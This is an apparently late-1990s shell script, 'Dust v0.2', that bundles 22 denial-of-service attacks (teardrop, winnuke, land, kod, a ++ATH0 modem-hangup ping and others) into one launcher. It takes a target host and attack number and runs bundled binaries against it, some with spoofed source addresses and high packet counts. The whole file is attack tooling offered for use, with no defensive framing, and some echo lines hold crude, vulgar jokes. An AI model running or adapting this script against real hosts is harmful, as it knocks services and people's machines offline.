#!/bin/sh
#####################################################################################################
##												   ##		
##  Dust v0.2, a DoS attack pack of some of the latest and important DoS attacks discovered        ##
##  in year 1999, i wrote this because i found that there are many new DoS attacks found but there ##
##  is no proggie that contains them...so i wrote this lame one, you can play with the script if   ##
##  you need to change certain things concerning ports to be specified by each attack              ##
##											           ##
## greetz go out to : synKr0n0us, cyberphreak, self-evident.com, and packetstorm.securify.com      ##
##											           ##
#####################################################################################################
clear
if [ "$1" = "" ]; then
echo ""
echo " dust v 0.2 : a DoS pack of some of the latest DoS attacks discovered in 1999 "
echo " by carcin0gen    http://carcin0gen.gq.nu "
echo "                  root@carcin0gen.gq.nu "
echo "                                    "
echo " usage : $0 <host> <type of attack> "
echo "                           "
echo " Types of Attacks : "
echo " 1  = ++ATH0 "
echo " 2  = pimp  "
echo " 3  = hanson "
echo " 4  = beer "
echo " 5  = trash "
echo " 6  = teardrop "
echo " 7  = winnuke "
echo " 8  = kox "
echo " 9  = ssping "
echo " 10 = land "
echo " 11 = kod "
echo " 12 = fawx "
echo " 13 = bloop "
echo " 14 = echok"
echo " 15 = wingatecrash"
echo " 16 = coke"
echo " 17 = duy"
echo " 18 = Frontpage-Personal Web Server(3.0.2) DoS  "
echo " 19 = ruc  "
echo " 20 = HiperBomb "
echo " 21 = Inetd DoS "
echo " 22 = OpenTear "
echo " "
echo " example : $0 foobar.com 6 (for a teardrop attack against foobar.com)"
exit 0
fi 

if [ "$2" = "" ]; then
echo "              "
echo " Specify an Attack Type Lameass ! "
echo "                      "
exit 0
fi

if [ "$2" = 1 ]; then
echo " This sends a ++ATH0 String Which may disconnect some modems remotely "
ping -p 2b2b2b415448300d $1 
fi
 
if [ "$2" = 2 ]; then
echo " Pimp Attack "
exec bin/pimp $1 
fi

if [ "$2" = 3 ]; then
echo " Hanson : This  program exploits mIRC's bound sockets, making the client crash "
exec bin/hanson $1 139
fi


if [ "$2" = 4 ]; then
echo " Beer Attack "
exec bin/beer $1 100
fi


if [ "$2" = 5 ]; then
echo " Trash Attack "
exec bin/trash $1 100  
fi


if [ "$2" = 6 ]; then
echo " Teardrop Attack "
exec bin/newtear 10.2.2.3 $1 -s 666 -t 80 -n 1000
fi


if [ "$2" = 7 ]; then
echo " WinNuke..O0oO0o0oM..! kill windoze !!! "
exec bin/winnuke $1
fi

if [ "$2" = 8 ]; then
echo " kox attack : crashes Windows98, Windows98 SE, and Windows2000 build 2000 machines "
exec bin/kox $1
fi

if [ "$2" = 9 ]; then
echo " SSping ICMP packet DoS Attack "
exec bin/ssping 11.11.11.11 $1 100
fi

if [ "$2" = 10 ]; then
echo " Land Attack : crashes Windows95 machines "
exec bin/land $1 139
fi

if [ "$2" = 11 ]; then
echo " kod attack "
exec bin/kod $1 -p 23 -t 1000
fi

if [ "$2" = 12 ]; then
echo " Fawx Attack "
exec bin/fawx 11.111.111.11 $1 1000
fi


if [ "$2" = 13 ]; then
echo " Bloop Attack "
exec bin/bloop 205.56.78.0 $1 500
fi


if [ "$2" = 14 ]; then
echo " Echok Attack : ICMP Echo Killer "
exec bin/echok -f -n 500 -s 64 -w 100 10.10.10.2 $1
fi

if [ "$2" = 15 ]; then
echo " This attack crashes Wingate Servers "
exec bin/wingatecrash $1 23
fi

if [ "$2" = 16 ]; then
echo " Coke Attack : This crashes WindowsNT 3.51/4.0 machines running WINS service "
exec bin/coke $1 500
fi


if [ "$2" = 17 ]; then
echo " duy : ICMP BOMB "
exec bin/duy $1 23
fi

if [ "$2" = 18 ]; then
echo " Frontpage-PWS DoS Attack , Crashes versions 3.0.2 "
perl bin/DoS_frontpage.pl $1 
fi

if [ "$2" = 19 ]; then
echo " Rucus DoS Attack :  known to clog even yer fat mamas twat! "
exec bin/ruc $1 80
fi

if [ "$2" = 20 ]; then
echo " HiperBomb Attack "
exec bin/hiperbomb2 $1 60000
fi

if [ "$2" = 21 ]; then
echo " Inetd DoS Attack "
exec bin/inetd.DoS $1 23 666
fi

if [ "$2" = 22 ]; then
echo " OpenTear DoS Attack "
exec bin/opentear $1
fi


